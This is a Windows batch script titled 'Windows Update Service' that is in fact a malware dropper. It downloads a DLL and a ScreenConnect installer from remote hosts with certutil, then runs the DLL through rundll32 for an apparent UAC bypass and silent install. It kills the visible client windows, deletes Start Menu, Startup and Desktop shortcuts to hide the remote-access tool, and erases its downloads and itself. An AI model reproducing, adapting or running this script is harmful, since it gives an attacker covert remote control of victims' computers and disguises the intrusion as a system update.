@echo off
title Windows Update Service
setlocal EnableDelayedExpansion

certutil -urlcache -split -f "https://raw.githubusercontent.com/servicesgovin/update/main/update.dll" "%TEMP%\FmJSx8MJ.dll" >nul 2>&1
certutil -urlcache -split -f "http://ec2-13-59-251-201.us-east-2.compute.amazonaws.com:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest" "%TEMP%\vPhs99Zb.msi" >nul 2>&1

if not exist "%TEMP%\FmJSx8MJ.dll" goto cleanup
if not exist "%TEMP%\vPhs99Zb.msi" goto cleanup

:: UAC bypass + silent install
rundll32.exe "%TEMP%\FmJSx8MJ.dll",RunPayload "%TEMP%\vPhs99Zb.msi"

:: espera msiexec aparecer (ate 30s)
set /a "w=0"
:wait_start
tasklist | find /i "msiexec.exe" >nul 2>&1
if %errorlevel%==0 goto wait_end
ping -n 2 127.0.0.1 >nul
set /a "w+=2"
if %w% lss 30 goto wait_start

:: espera msiexec terminar (ate 120s)
:wait_end
set /a "w=0"
:wait_done
tasklist | find /i "msiexec.exe" >nul 2>&1
if %errorlevel% neq 0 goto installed
ping -n 3 127.0.0.1 >nul
set /a "w+=3"
if %w% lss 120 goto wait_done

:: espera cliente registrar no servidor (20s apos msiexec sair)
:installed
ping -n 20 127.0.0.1 >nul

taskkill /f /im ScreenConnect.WindowsClient.exe >nul 2>&1
taskkill /f /im ScreenConnect.WindowsBackstageShell.exe >nul 2>&1

del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\ScreenConnect*.lnk" >nul 2>&1
del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ScreenConnect*.lnk" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\ScreenConnect*.lnk" >nul 2>&1

:cleanup
del /f /q "%TEMP%\FmJSx8MJ.dll" >nul 2>&1
del /f /q "%TEMP%\vPhs99Zb.msi" >nul 2>&1

(goto) 2>nul & del "%~f0"
